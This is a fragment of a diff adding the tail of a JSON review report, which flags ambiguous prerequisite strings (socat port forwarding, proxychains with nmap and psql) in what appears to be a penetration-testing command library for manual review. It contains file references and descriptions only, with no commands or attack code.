+          {
+            "file": "data/commands/pivoting/ssh-tunneling.json",
+            "command_id": "socat-port-forward",
+            "field": "prerequisites"
+          }
+        ],
+        "count": 1
+      },
+      {
+        "text": "Proxychains configured: /etc/proxychains4.conf has correct SOCKS proxy",
+        "reason": "Needs manual context review",
+        "metadata": {
+          "type": "ambiguous"
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/pivoting/proxychains-utilities.json",
+            "command_id": "proxychains-nmap",
+            "field": "prerequisites"
+          }
+        ],
+        "count": 1
+      },
+      {
+        "text": "Proxychains configured with correct SOCKS proxy",
+        "reason": "Needs manual context review",
+        "metadata": {
+          "type": "ambiguous"
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/pivoting/proxychains-utilities.json",
+            "command_id": "proxychains-psql",
+            "field": "prerequisites"
+          }
+        ],
+        "count": 1
+      }
+    ]
+  }
+}
